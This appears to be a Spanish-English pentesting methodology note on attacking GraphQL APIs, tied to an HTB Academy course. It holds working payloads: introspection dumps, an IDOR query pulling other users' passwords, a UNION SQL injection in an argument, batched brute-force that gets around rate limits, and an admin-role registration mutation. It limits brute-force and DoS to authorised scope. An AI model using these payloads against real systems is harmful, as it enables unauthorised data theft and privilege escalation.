---
title: Attacking GraphQL (introspection, IDOR, SQLi, batching, mutations)
slug: graphql-attacks
category: techniques
updated: 2026-08-20
summary: "GraphQL: fingerprint (graphw00f), introspection (__schema/__type dump), IDOR por argumento, SQLi UNION en args, batching brute-force (salta rate-limit), mutations para privesc (role:admin)"
tags: [web, graphql, introspection, idor, sqli, api, privesc, batching]
sensitive: false
---

# Attacking GraphQL

## When to use
Endpoint `/graphql` (o GraphiQL). Un solo endpoint expone todo el modelo de
datos → introspection lo mapea, y los mismos bugs web (IDOR/SQLi/authz) aplican.
Hub: [[web-app-attacks]], [[api-attacks]].

## Fingerprint + descubrir endpoint
```bash
git clone https://github.com/dolevf/graphw00f && python3 main.py -d -f -t http://TARGET
# → endpoint /graphql + motor (Graphene/Apollo/…) + graphql-threat-matrix
```
GraphiQL en el navegador (`/graphql`) = enviar queries sin romper JSON.

## Introspection (recon)
```graphql
{ __schema { types { name } } }                          # todos los tipos (incl. UserObject)
{ __type(name:"UserObject"){ fields { name type{name kind} } } }   # campos (username, password!)
{ __schema { queryType { fields { name description } } } }         # queries soportadas
```
Query IntrospectionQuery completa (FullType/TypeRef fragments) → volcar todo, visualizar en **GraphQL-Voyager** (self-host en engagement real, no la demo pública con datos del target).

## IDOR / Broken authorization
Query por argumento sin check de authz:
```graphql
{ user(username: "test") { username password } }   # datos de OTRO usuario
```
Usar introspection para descubrir campos sensibles (`password`) y añadirlos a la query.

## Inyección (SQLi / XSS)
Descubrir queries con args (enviar sin arg → error revela el nombre). Probar `'` en cada arg:
```graphql
{ user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") { username } }
```
Nº de columnas del UNION = nº de campos del objeto; el campo que pidas mapea a esa columna en la respuesta. Ver [[sql-injection]]. XSS: args reflejados sin encoding en mensajes de error.

## Batching → brute-force que salta rate-limit
Múltiples queries en una request (lista JSON):
```json
[ {"query":"{user(username:\"admin\"){uuid}}"}, {"query":"{post(id:1){title}}"} ]
```
Si el login es una query GraphQL, batching mete N intentos por request → el rate-limit por-request se vuelve inútil. Es brute-force → **prohibido por defecto**, requiere aprobación nombrada + throttle/lockout (ver [[scope]]).

## Mutations → escritura / privesc
```graphql
{ __schema { mutationType { fields { name args { name type{...} } } } } }   # descubrir mutations
{ __type(name:"RegisterUserInput"){ inputFields { name description defaultValue } } }
# Registro con role controlado → privesc a admin:
mutation { registerUser(input:{username:"x", password:"<md5>", role:"admin", msg:"h"}) { user{ username role } } }
```
`echo -n 'password' | md5sum` si pide hash. Mutation que expone `role`/`active` = mass-assignment → admin.

## DoS por nested loops — CONOCIMIENTO, NO EJECUTAR
El loop `UserObject.posts ↔ PostObject.author` permite queries anidadas de crecimiento exponencial que tumban el server. **DoS está prohibido outright** en este framework — ninguna aprobación lo habilita (ver [[scope]]). Reportarlo como hallazgo (falta de límite de profundidad/complejidad), nunca dispararlo contra un target.

## Gotchas
- Introspection puede estar deshabilitada en prod → fallback a fuzzing de campos/errores.
- La DB puede tener tablas/columnas no expuestas por el schema → SQLi las alcanza igual.

## References
- Relacionado: [[web-app-attacks]], [[api-attacks]], [[sql-injection]], [[web-fuzzing]]
- graphw00f, graphql-threat-matrix, GraphQL-Voyager. Curso CWES Bug Bounty → 03-WEB → "Attacking GraphQL" (HTB Academy). Notion.
